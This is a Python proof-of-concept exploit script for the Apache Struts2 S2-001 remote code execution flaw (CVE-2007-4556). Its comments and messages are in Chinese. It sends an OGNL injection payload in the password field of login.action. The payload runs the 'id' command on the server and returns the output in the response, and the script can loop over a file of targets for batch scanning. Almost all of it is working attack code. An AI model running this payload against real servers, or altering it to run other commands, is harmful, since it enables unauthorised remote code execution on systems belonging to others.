'''
Author: twsec
Date: 2022-12-14 16:24:41
LastEditors: twsec
LastEditTime: 2022-12-19 17:40:08
Description: S2-001 远程代码执行漏洞-POC
'''
from bs4 import BeautifulSoup
import requests
import getopt
import sys

def usage():
    #生成一个图案
    print(''' 

  __                                    
_/  |_ __  _  __  ______  ____    ____  
\   __\\ \/ \/ / /  ___/_/ __ \ _/ ___\ 
 |  |   \     /  \___ \ \  ___/ \  \___ 
 |__|    \/\_/  /____  > \___  > \___  >
                     \/      \/      \/ 

python3 CVE-2007-4556-POC.py -u url / -f file
-u url: 目标地址
-f file: 批量检测
-h help: 帮助
想念你的时候，我会用你的名字喊醒自己。
''')


def check(target):
    
    
    url1 = "login.action"
    url = target + url1
    

    headers = { "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate", 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62", 
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",}


    data = {
        'username': '1212',
        'password': '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
    }


    try:

        response = requests.post(url=url, headers=headers, data=data, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'lxml')
            getexec = soup.find("table")
            print(getexec)
            print("存在S2-001漏洞!")

            
        else:
            print("不存在S2-001漏洞!")
    except:
        print("检测错误！")

#main函数

if __name__ == '__main__':
    usage()
    try:

        opts, args = getopt.getopt(sys.argv[1:], "ht:f:")
    except getopt.GetoptError:
        print('python3 CVE-2007-4556-POC.py -u url / -f file')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h' or opt == '--help':
            print('python3 CVE-2007-4556-POC.py -u url / -f file')
            sys.exit()

        if opt == '-t' or opt == '--target':
            target = arg
            #print(target)
            check(target)
            sys.exit()
        if opt == '-f' or opt == '--file':
            file = arg
            with open(file, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    print(target)
                    check(target)
                    sys.exit()

